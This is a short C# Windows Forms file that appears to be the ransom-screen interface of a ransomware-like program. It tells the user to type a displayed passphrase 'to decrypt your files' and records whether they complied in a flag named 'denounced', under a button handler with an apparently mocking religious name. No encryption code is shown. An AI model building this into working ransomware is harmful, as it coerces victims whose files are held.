using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace DUMB
{
    public partial class Main : Form
    {
        public Main(Stopwatch s)
        {
            InitializeComponent();

            labelTime.Text = String.Format("Processing took {0:0.00}s", s.Elapsed.TotalSeconds);
            labelPhrase.Text = String.Format("To decrypt your files please enter the following into the textbox below:\r\n'{0}'", Program.PASSPHRASE);
        }

        public bool denounced = false;
        private void btnALLAHUAKBAR_Click(object sender, EventArgs e)
        {
            denounced = (String.Compare(txtWhatever.Text, Program.PASSPHRASE, StringComparison.OrdinalIgnoreCase) == 0);
            this.Close();
        }
    }
}
